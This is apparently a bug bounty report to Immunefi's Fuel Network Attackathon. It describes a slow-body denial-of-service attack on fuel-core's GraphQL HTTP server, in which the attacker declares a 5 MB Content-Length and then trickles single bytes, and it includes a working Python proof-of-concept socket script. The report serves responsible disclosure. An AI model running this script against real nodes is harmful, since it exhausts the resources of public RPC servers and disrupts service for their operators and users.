# Attackathon \_ Fuel Network 32695 - \[Blockchain\_DLT - Insight] increasing processing for public nodes

Submitted on Sat Jun 29 2024 20:16:55 GMT-0400 (Atlantic Standard Time) by @fnmain for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32695

Report type: Blockchain/DLT

Report severity: Insight

Target: <https://github.com/FuelLabs/fuel-core/tree/8b1bf02103b8c90ce3ef2ba715214fb452b99885>

Impacts:

* Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
* increasing processing on public RPC nodes

## Description

## Brief/Intro

increasing the processing for the nodes that have the graphQL instance is possible by playing by content length and then sending byte per byte continually is able to elevate the nodes processing to 50% and with more connexions is able to elevate it to more (for at least 30s) which make bypassing the rate limit possible to maintain the attack on the targeted node

## Vulnerability Details

the built in http server if the content length have a huge value the connexion will stay open and the attacker can send whatever data he want but with sending byte each send operation we can freeze the processing at 50% with 1 operator for at least 30s

## Impact Details

elevating the processing on the targeted node ( possible pushing one server to out of service by performing a resource exhaust )

## References

Add any relevant links to documentation or code

## Proof of concept

## Proof of Concept

PoC:

```
import socket
from time import sleep as w

s=socket.socket()
vs = __import__("sys").argv
(H,P)=("127.0.0.1", 4000)

s.connect((H, P))
print("[+] connection estabilished")
headers = [
    "POST /v1/graphql-sub HTTP/1.1",
    "Host: 127.0.0.1:4000",
    "User-Agent: destroyer_v1.0",
    "Accept: */*",
    "Content-Type: application/json",
    f"Content-Length: {5*1024*1024}",
]

headers = "\r\n".join(headers)
req = f"{headers}\r\n\r\n"

#print(req);__import__("sys").exit()

s.send(req.encode())



def overflow():
    #__import__("time").sleep(5)
    ovbuf = "A"*1
    c = 0
    try:
        while True:
            print(c,end="\r")
            s.send(ovbuf.encode())
            c=c+1
    except:
        print(f"{str(c)} trys")

overflow()
print(s.recv(0x1337).decode())
```
